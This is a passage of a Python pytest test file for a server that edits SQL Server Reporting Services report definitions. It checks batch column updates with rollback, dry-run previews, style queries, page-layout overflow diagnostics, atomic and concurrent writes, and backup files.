        assert tr_fmt is not None and tr_fmt.text == 'C2'

        header_tb = root.find(f'.//{ns}Textbox[@Name="HeaderAmount"]')
        assert header_tb.find(f'{ns}Style/{ns}Color').text == 'White'
        assert header_tb.find(f'{ns}Style/{ns}BackgroundColor').text == 'DarkBlue'

    def test_batch_returns_diff(self, server, temp_report):
        updates = [{'column_index': 0, 'width': '1.5in'}]
        result = server.update_table_batch(temp_report, updates)

        assert result['success'] is True
        diff = result['diff']
        assert len(diff) == 1
        assert diff[0]['column_index'] == 0
        assert 'width' in diff[0]['changes']
        assert diff[0]['changes']['width']['after'] == '1.5in'

    def test_batch_all_or_none_on_bad_index(self, server, temp_report):
        # One valid + one invalid column_index – should fail, original untouched
        original_cols = server.get_rdl_columns(temp_report)['columns']
        updates = [
            {'column_index': 0, 'width': '5in'},   # valid
            {'column_index': 99, 'width': '1in'},  # invalid
        ]
        result = server.update_table_batch(temp_report, updates)

        assert result['success'] is False
        # File must remain unmodified
        after_cols = server.get_rdl_columns(temp_report)['columns']
        assert after_cols[0]['width'] == original_cols[0]['width']

    def test_batch_empty_updates_returns_error(self, server, temp_report):
        result = server.update_table_batch(temp_report, [])
        assert result['success'] is False

    def test_batch_returns_integrity_checks(self, server, temp_report):
        updates = [{'column_index': 0, 'header': 'New Header'}]
        result = server.update_table_batch(temp_report, updates)
        assert result['success'] is True
        assert result.get('integrity_checks', {}).get('xml_valid') is True

    def test_batch_backup_creates_bak_file(self, server, temp_report):
        updates = [{'column_index': 0, 'width': '1.2in'}]
        result = server.update_table_batch(temp_report, updates, backup=True)

        assert result['success'] is True
        backup_path = result.get('backup_path')
        assert backup_path is not None
        assert os.path.isfile(backup_path)
        # Cleanup
        os.unlink(backup_path)

    def test_batch_no_backup_by_default(self, server, temp_report):
        updates = [{'column_index': 0, 'width': '1.2in'}]
        result = server.update_table_batch(temp_report, updates, backup=False)

        assert result['success'] is True
        assert result.get('backup_path') is None

    def test_batch_alignment_update(self, server, temp_report):
        updates = [{'column_index': 2, 'alignment': 'Right'}]
        result = server.update_table_batch(temp_report, updates)

        assert result['success'] is True
        import xml.etree.ElementTree as ET
        ns = '{http://schemas.microsoft.com/sqlserver/reporting/2016/01/reportdefinition}'
        root = ET.parse(temp_report).getroot()
        data_tb = root.find(f'.//{ns}Textbox[@Name="DataAmount"]')
        assert data_tb.find(f'{ns}Style/{ns}TextAlign').text == 'Right'


class TestPreviewTableBatch:
    """Tests for the dry-run preview_table_batch operation."""

    def test_preview_does_not_modify_file(self, server, temp_report):
        with open(temp_report, 'rb') as f:
            original_bytes = f.read()

        updates = [{'column_index': 0, 'width': '5in', 'header': 'ChangedHeader'}]
        result = server.preview_table_batch(temp_report, updates)

        assert result.get('dry_run') is True
        with open(temp_report, 'rb') as f:
            after_bytes = f.read()
        assert original_bytes == after_bytes

    def test_preview_returns_diff(self, server, temp_report):
        updates = [{'column_index': 0, 'width': '3in'}]
        result = server.preview_table_batch(temp_report, updates)

        assert result.get('dry_run') is True
        diff = result['diff']
        assert len(diff) == 1
        assert diff[0]['changes']['width']['after'] == '3in'

    def test_preview_invalid_index_returns_error(self, server, temp_report):
        updates = [{'column_index': 99, 'width': '1in'}]
        result = server.preview_table_batch(temp_report, updates)

        assert result.get('dry_run') is True
        assert 'error_code' in result

    def test_preview_mutation_id_present(self, server, temp_report):
        updates = [{'column_index': 0, 'header': 'X'}]
        result = server.preview_table_batch(temp_report, updates)
        assert 'mutation_id' in result


class TestGetColumnStyles:
    """Tests for get_column_styles read API."""

    def test_returns_columns_list(self, server, temp_report):
        result = server.get_column_styles(temp_report)
        assert 'columns' in result
        assert len(result['columns']) == 3

    def test_columns_have_index_and_width(self, server, temp_report):
        result = server.get_column_styles(temp_report)
        col = result['columns'][0]
        assert col['index'] == 0
        assert col['width'] != ''

    def test_reflects_updated_colors(self, server, temp_report):
        # Apply a color then verify it shows in get_column_styles
        server.update_column_colors(temp_report, 0, text_color='Navy')

        result = server.get_column_styles(temp_report)
        data_style = result['columns'][0]['data']
        assert data_style.get('text_color') == 'Navy'

    def test_reflects_format(self, server, temp_report):
        server.update_column_format(temp_report, 2, 'P2')
        result = server.get_column_styles(temp_report)
        assert result['columns'][2]['data'].get('format') == 'P2'


class TestGetTableStyles:
    """Tests for get_table_styles read API."""

    def test_returns_table_name(self, server, temp_report):
        result = server.get_table_styles(temp_report)
        assert 'table_name' in result
        assert result['table_name'] == 'MainTable'

    def test_returns_table_styles_dict(self, server, temp_report):
        result = server.get_table_styles(temp_report)
        assert 'table_styles' in result
        assert isinstance(result['table_styles'], dict)


class TestGetLayoutDiagnostics:
    """Tests for get_layout_diagnostics read API."""

    def test_returns_page_dimensions(self, server, temp_report):
        result = server.get_layout_diagnostics(temp_report)
        assert 'page_width' in result
        assert result['page_width'] == '8.5000in'
        assert result['page_height'] == '11.0000in'

    def test_returns_margins(self, server, temp_report):
        result = server.get_layout_diagnostics(temp_report)
        assert result['left_margin'] == '0.5000in'
        assert result['right_margin'] == '0.5000in'

    def test_returns_printable_width(self, server, temp_report):
        result = server.get_layout_diagnostics(temp_report)
        # 8.5 - 0.5 - 0.5 = 7.5
        assert result['printable_width'] == '7.5000in'

    def test_returns_tablix_width(self, server, temp_report):
        result = server.get_layout_diagnostics(temp_report)
        # 1in + 2in + 1.5in = 4.5in
        assert result['tablix_width'] == '4.5000in'

    def test_tablix_fits_flag(self, server, temp_report):
        result = server.get_layout_diagnostics(temp_report)
        assert result['tablix_fits'] is True
        assert result['overflow_inches'] == 0.0

    def test_overflow_detected_when_columns_exceed_page(self, server, temp_report):
        # Widen columns to force overflow
        server.update_column_width(temp_report, 0, '4in')
        server.update_column_width(temp_report, 1, '4in')
        server.update_column_width(temp_report, 2, '4in')

        result = server.get_layout_diagnostics(temp_report)
        assert result['tablix_fits'] is False
        assert result['overflow_inches'] > 0

    def test_returns_column_count(self, server, temp_report):
        result = server.get_layout_diagnostics(temp_report)
        assert result['column_count'] == 3


class TestAtomicWriteAndConcurrency:
    """Tests for atomic write safety and per-file concurrency protection."""

    def test_file_not_corrupted_after_write(self, server, temp_report):
        """Written file must be parseable XML (no half-writes or empty file)."""
        import xml.etree.ElementTree as ET
        server.update_column_width(temp_report, 0, '1.5in')

        # File must be non-empty valid XML
        assert os.path.getsize(temp_report) > 0
        tree = ET.parse(temp_report)
        assert tree.getroot() is not None

    def test_concurrent_writes_do_not_corrupt(self, server, temp_report):
        """Multiple threads writing to the same file should not corrupt it."""
        import threading
        import xml.etree.ElementTree as ET

        errors = []

        def write_width(idx, width):
            try:
                server.update_column_width(temp_report, idx % 3, width)
            except Exception as exc:
                errors.append(exc)

        threads = [
            threading.Thread(target=write_width, args=(i, f'{(i % 3) + 1}in'))
            for i in range(10)
        ]
        for t in threads:
            t.start()
        for t in threads:
            t.join()

        assert errors == [], f"Thread errors: {errors}"
        # File must still be valid XML after concurrent writes
        assert os.path.getsize(temp_report) > 0
        tree = ET.parse(temp_report)
        assert tree.getroot() is not None

    def test_backup_file_contains_original_content(self, server, temp_report):
        """Backup must contain the file content as it was before the write."""
        with open(temp_report, 'r') as f:
            original_content = f.read()

        new_header = 'UNIQUE_BATCH_HEADER_XYZ'
        updates = [{'column_index': 0, 'header': new_header}]
        result = server.update_table_batch(temp_report, updates, backup=True)

        assert result['success'] is True
        backup_path = result['backup_path']
        try:
            with open(backup_path, 'r') as f:
                backup_content = f.read()
            # Backup was taken before the write, so new header must NOT be in it
            assert new_header not in backup_content
            assert original_content == backup_content
        finally:
            if os.path.isfile(backup_path):
                os.unlink(backup_path)



if __name__ == '__main__':
    pytest.main([__file__, '-v'])
